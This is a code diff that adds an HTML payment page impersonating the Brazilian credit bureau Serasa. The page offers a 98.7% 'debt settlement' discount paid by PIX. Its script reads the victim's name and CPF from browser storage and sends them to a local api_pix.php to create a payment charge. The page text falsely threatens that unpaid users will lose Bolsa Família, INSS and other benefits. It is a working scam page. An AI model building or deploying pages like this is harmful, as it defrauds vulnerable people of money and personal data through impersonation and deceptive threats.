@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento - Quitação de Dívidas</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .header {
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: #e91e63;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #e91e63;
+        }
+
+        .back-btn {
+            background: #f3f4f6;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            color: #374151;
+            text-decoration: none;
+            font-weight: 500;
+            transition: background-color 0.2s;
+        }
+
+        .back-btn:hover {
+            background: #e5e7eb;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        .payment-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+
+        .payment-header {
+            padding: 30px;
+            text-align: center;
+            border-bottom: 1px solid #e5e7eb;
+            background: linear-gradient(135deg, #e91e63, #ad1457);
+            color: white;
+        }
+
+        .payment-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .payment-subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .debt-info {
+            padding: 30px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .debt-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .debt-item:last-child {
+            border-bottom: none;
+            font-weight: 600;
+            font-size: 18px;
+            color: #e91e63;
+        }
+
+        .debt-label {
+            color: #6b7280;
+        }
+
+        .debt-value {
+            font-weight: 600;
+            color: #111827;
+        }
+
+        .payment-section {
+            padding: 30px;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .amount-display {
+            background: #f0fdf4;
+            border: 2px solid #22c55e;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .amount-label {
+            font-size: 14px;
+            color: #6b7280;
+            margin-bottom: 8px;
+        }
+
+        .amount-value {
+            font-size: 32px;
+            font-weight: 700;
+            color: #22c55e;
+        }
+
+        .discount-info {
+            background: #fef3c7;
+            border: 1px solid #f59e0b;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .discount-text {
+            font-size: 14px;
+            color: #92400e;
+            font-weight: 500;
+        }
+
+        .pay-btn {
+            width: 100%;
+            background: #e91e63;
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 24px;
+            transition: all 0.2s;
+        }
+
+        .pay-btn:hover {
+            background: #ad1457;
+            transform: translateY(-1px);
+        }
+
+        .pay-btn:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 16px;
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        .security-icon {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+
+        /* Modal PIX */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            backdrop-filter: blur(4px);
+        }
+
+        .modal {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 16px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            padding: 24px 24px 0;
+            text-align: center;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 8px;
+        }
+
+        .modal-subtitle {
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        .modal-content {
+            padding: 24px;
+        }
+
+        .pix-qr {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 16px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f9fafb;
+        }
+
+        .pix-code-section {
+            background: #f9fafb;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .pix-code-label {
+            font-size: 14px;
+            color: #6b7280;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .pix-code {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #111827;
+            background: white;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #e5e7eb;
+            word-break: break-all;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+
+        .copy-btn {
+            width: 100%;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .copy-btn:hover {
+            background: #2563eb;
+        }
+
+        .modal-footer {
+            padding: 0 24px 24px;
+            text-align: center;
+        }
+
+        .close-btn {
+            background: #f3f4f6;
+            color: #374151;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .close-btn:hover {
+            background: #e5e7eb;
+        }
+
+        /* Aviso de Atenção */
+        .warning-alert {
+            background: #fef3c7;
+            border: 2px solid #f59e0b;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .warning-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            font-size: 16px;
+            color: #92400e;
+        }
+
+        .warning-icon {
+            font-size: 20px;
+        }
+
+        .warning-content {
+            color: #92400e;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .warning-content p {
+            margin-bottom: 8px;
+        }
+
+        .warning-content ul {
+            margin: 8px 0 0 20px;
+        }
+
+        .warning-content li {
+            margin-bottom: 4px;
+        }
+
+        /* Tutorial PIX */
+        .pix-tutorial {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        .tutorial-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+
+        .tutorial-option {
+            background: #f9fafb;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+
+        .option-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 12px;
+        }
+
+        .tutorial-steps {
+            margin: 0;
+            padding-left: 20px;
+            color: #374151;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .tutorial-steps li {
+            margin-bottom: 6px;
+        }
+
+        .tutorial-important {
+            background: #eff6ff;
+            border: 1px solid #3b82f6;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 16px;
+        }
+
+        .important-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e40af;
+            margin-bottom: 8px;
+        }
+
+        .tutorial-important p {
+            color: #1e40af;
+            font-size: 13px;
+            line-height: 1.4;
+            margin: 0;
+        }
+
+        @media (max-width: 640px) {
+            .container {
+                margin: 20px auto;
+                padding: 0 16px;
+            }
+
+            .payment-header,
+            .debt-info,
+            .payment-section {
+                padding: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <div class="logo-icon">S</div>
+                <span class="logo-text">serasa</span>
+            </div>
+            <a href="typebot.html" class="back-btn">← Voltar</a>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="payment-card">
+            <div class="payment-header">
+                <h1 class="payment-title">Quitação de Dívidas</h1>
+                <p class="payment-subtitle">Pagamento via PIX</p>
+            </div>
+
+            <div class="debt-info">
+                <div class="debt-item">
+                    <span class="debt-label">Valor total das dívidas:</span>
+                    <span class="debt-value" id="totalDebt">R$ 0,00</span>
+                </div>
+                <div class="debt-item">
+                    <span class="debt-label">Desconto (98,7%):</span>
+                    <span class="debt-value" id="discountAmount">R$ 0,00</span>
+                </div>
+                <div class="debt-item">
+                    <span class="debt-label">Valor a pagar:</span>
+                    <span class="debt-value" id="finalAmount">R$ 0,00</span>
+                </div>
+            </div>
+
+            <div class="payment-section">
+                <h2 class="section-title">Confirme o pagamento</h2>
+                
+                <div class="amount-display">
+                    <div class="amount-label">Valor final com desconto</div>
+                    <div class="amount-value" id="displayAmount">R$ 0,00</div>
+                </div>
+
+                <div class="discount-info">
+                    <div class="discount-text">
+                        🎉 Você está economizando <strong id="savingsAmount">R$ 0,00</strong> com este acordo!
+                    </div>
+                </div>
+
+                <!-- Aviso de Atenção -->
+                <div class="warning-alert">
+                    <div class="warning-header">
+                        <span class="warning-icon">⚠️</span>
+                        <strong>ATENÇÃO!</strong>
+                    </div>
+                    <div class="warning-content">
+                        <p>O <strong>NÃO PAGAMENTO</strong> do acordo confirmado, a oferta com até 99% de desconto <strong>SERÁ CANCELADA</strong> e só poderá voltar no próximo feirão.</p>
+                        <p>Além disso, seu nome continuará com <strong>RESTRIÇÃO</strong>, o que pode bloquear benefícios importantes como:</p>
+                        <ul>
+                            <li>Restrição do Bolsa Família</li>
+                            <li>Restrição no Cadastro INSS</li>
+                            <li>Restrição de outros auxílios de 2025</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <button id="payBtn" class="pay-btn">
+                    Pagar com PIX
+                </button>
+
+                <div class="security-info">
+                    <svg class="security-icon" viewBox="0 0 16 16">
+                        <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zM3 7v4a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V7a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1z"/>
+                    </svg>
+                    Pagamento 100% seguro via PIX
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal PIX -->
+    <div id="pixModal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h3 class="modal-title">Pagamento via PIX</h3>
+                <p class="modal-subtitle">Escaneie o código QR ou copie o código PIX</p>
+            </div>
+            <div class="modal-content">
+                <div class="pix-qr">
+                    <div class="qr-code" id="qrCode">
+                        <span>QR Code será exibido aqui</span>
+                    </div>
+                    <p style="font-size: 14px; color: #6b7280;">Valor: <strong id="pixAmount">R$ 0,00</strong></p>
+                </div>
+                
+                <div class="pix-code-section">
+                    <div class="pix-code-label">Código PIX (Copia e Cola):</div>
+                    <div class="pix-code" id="pixCode">Código será gerado aqui...</div>
+                    <button class="copy-btn" onclick="copyPixCode()">📋 Copiar código PIX</button>
+                </div>
+
+                <!-- Tutorial de Pagamento PIX -->
+                <div class="pix-tutorial">
+                    <h4 class="tutorial-title">Como pagar usando PIX</h4>
+                    
+                    <div class="tutorial-option">
+                        <h5 class="option-title">Opção 1: Código Copia e Cola</h5>
+                        <ol class="tutorial-steps">
+                            <li>Abra o aplicativo do seu banco</li>
+                            <li>Procure a opção "PIX" ou "Pagar com PIX"</li>
+                            <li>Selecione "Copiar e Colar" ou "PIX Copia e Cola"</li>
+                            <li>Cole o código PIX que você copiou acima</li>
+                            <li>Confira os dados e confirme o pagamento</li>
+                        </ol>
+                    </div>
+
+                    <div class="tutorial-option">
+                        <h5 class="option-title">Opção 2: Usando outro celular</h5>
+                        <ol class="tutorial-steps">
+                            <li>Abra o aplicativo do seu banco</li>
+                            <li>Procure a opção "PIX" ou "Pagar com PIX"</li>
+                            <li>Selecione "Ler QR Code" ou o ícone da câmera</li>
+                            <li>Aponte a câmera do celular para o QR Code exibido acima</li>
+                            <li>Confira os dados e confirme o pagamento</li>
+                        </ol>
+                    </div>
+
+                    <div class="tutorial-important">
+                        <h5 class="important-title">Importante:</h5>
+                        <p>Após realizar o pagamento, aguarde a confirmação. O sistema verificará automaticamente seu pagamento a cada 10 segundos. Você também pode clicar em "Verificar Pagamento" para uma verificação manual.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="close-btn" onclick="closePixModal()">Fechar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Carregar dados do localStorage
+        function loadPaymentData() {
+            const totalDebt = parseFloat(localStorage.getItem('totalDebt')) || 0;
+            const discountPercentage = 98.7;
+            const discountAmount = totalDebt * (discountPercentage / 100);
+            const finalAmount = totalDebt - discountAmount;
+
+            // Log dos valores carregados
+            console.log('💳 Checkout - Valores carregados:');
+            console.log('- Total da dívida:', totalDebt);
+            console.log('- Desconto (98.7%):', discountAmount);
+            console.log('- Valor final:', finalAmount);
+            console.log('- Nome do cliente:', localStorage.getItem('userName'));
+            console.log('- CPF do cliente:', localStorage.getItem('userCPF'));
+
+            // Atualizar interface
+            document.getElementById('totalDebt').textContent = formatCurrency(totalDebt);
+            document.getElementById('discountAmount').textContent = formatCurrency(discountAmount);
+            document.getElementById('finalAmount').textContent = formatCurrency(finalAmount);
+            document.getElementById('displayAmount').textContent = formatCurrency(finalAmount);
+            document.getElementById('savingsAmount').textContent = formatCurrency(discountAmount);
+
+            return finalAmount;
+        }
+
+        function formatCurrency(value) {
+            return 'R$ ' + value.toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+        }
+
+        // Carregar dados ao inicializar
+        const paymentAmount = loadPaymentData();
+
+        // Botão de pagamento
+        document.getElementById('payBtn').addEventListener('click', () => {
+            generatePix(paymentAmount);
+        });
+
+        async function generatePix(amount) {
+            const btn = document.getElementById('payBtn');
+            const originalText = btn.textContent;
+            
+            // Log do valor que será enviado para o PIX
+            console.log('🎯 Gerando PIX com valor:', amount);
+            console.log('📝 Descrição:', `Quitação de dívidas - R$ ${amount.toFixed(2).replace('.', ',')}`);
+            console.log('👤 Cliente:', localStorage.getItem('userName') || 'Cliente');
+            console.log('🆔 CPF:', localStorage.getItem('userCPF') || '00000000000');
+            
+            btn.disabled = true;
+            btn.textContent = 'Gerando PIX...';
+            
+            try {
+                const response = await fetch('checkout pix/api_pix.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        amount: amount,
+                        description: `Quitação de dívidas - R$ ${amount.toFixed(2).replace('.', ',')}`,
+                        customer_name: localStorage.getItem('userName') || 'Cliente',
+                        customer_cpf: localStorage.getItem('userCPF') || '00000000000'
+                    })
+                });
+
+                const data = await response.json();
+                console.log('Resposta da API PIX:', data);
+                
+                if (data.success) {
+                    showPixModal(data);
+                } else {
+                    console.error('Erro da API PIX:', data);
+                    alert('Erro ao gerar PIX: ' + (data.error || 'Erro desconhecido'));
+                }
+            } catch (error) {
+                console.error('Erro:', error);
+                alert('Erro ao conectar com o servidor. Tente novamente.');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = originalText;
+            }
+        }
+
+        function showPixModal(pixData) {
+            console.log('Dados PIX recebidos:', pixData);
+            
+            document.getElementById('pixAmount').textContent = formatCurrency(pixData.amount);
+            
+            // QR Code
+            const qrContainer = document.getElementById('qrCode');
+            const qrCodeUrl = pixData.pix_qr_code || pixData.qr_code || pixData.image;
+            
+            console.log('URL do QR Code:', qrCodeUrl);
+            
+            if (qrCodeUrl) {
+                const img = document.createElement('img');
+                img.style.cssText = 'width: 100%; height: 100%; object-fit: contain;';
+                img.alt = 'QR Code PIX';
+                
+                img.onload = function() {
+                    console.log('✅ QR Code carregado com sucesso!');
+                };
+                
+                img.onerror = function() {
+                    console.log('❌ Erro ao carregar QR Code da API, gerando fallback...');
+                    const pixCodeForFallback = pixData.pix_code || pixData.code || '';
+                    const fallbackUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCodeForFallback)}`;
+                    this.src = fallbackUrl;
+                    
+                    this.onerror = function() {
+                        console.log('❌ Fallback também falhou');
+                        qrContainer.innerHTML = '<span style="color: #6b7280;">QR Code temporariamente indisponível</span>';
+                    };
+                };
+                
+                img.src = qrCodeUrl;
+                qrContainer.innerHTML = '';
+                qrContainer.appendChild(img);
+            } else {
+                console.log('QR Code não encontrado nos dados, gerando com serviço externo...');
+                const pixCode = pixData.pix_code || pixData.code || '';
+                if (pixCode) {
+                    const externalQrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
+                    qrContainer.innerHTML = `<img src="${externalQrUrl}" alt="QR Code PIX" style="width: 100%; height: 100%; object-fit: contain;" onload="console.log('QR Code externo carregado!')" onerror="this.parentNode.innerHTML = '<span style=color:#6b7280;>QR Code indisponível</span>'">`;
+                } else {
+                    qrContainer.innerHTML = '<span style="color: #6b7280;">QR Code não disponível</span>';
+                }
+            }
+            
+            // Código PIX
+            const pixCode = pixData.pix_code || pixData.code || 'Código não disponível';
+            console.log('Código PIX:', pixCode);
+            document.getElementById('pixCode').textContent = pixCode;
+            
+            // Mostrar modal
+            document.getElementById('pixModal').style.display = 'block';
+        }
+
+        function closePixModal() {
+            document.getElementById('pixModal').style.display = 'none';
+        }
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode').textContent;
+            navigator.clipboard.writeText(pixCode).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '✅ Copiado!';
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                }, 2000);
+            }).catch(() => {
+                alert('Erro ao copiar. Tente selecionar e copiar manualmente.');
+            });
+        }
+
+        // Fechar modal ao clicar fora
+        document.getElementById('pixModal').addEventListener('click', (e) => {
+            if (e.target.id === 'pixModal') {
+                closePixModal();
+            }
+        });
+    </script>
+</body>
+</html>
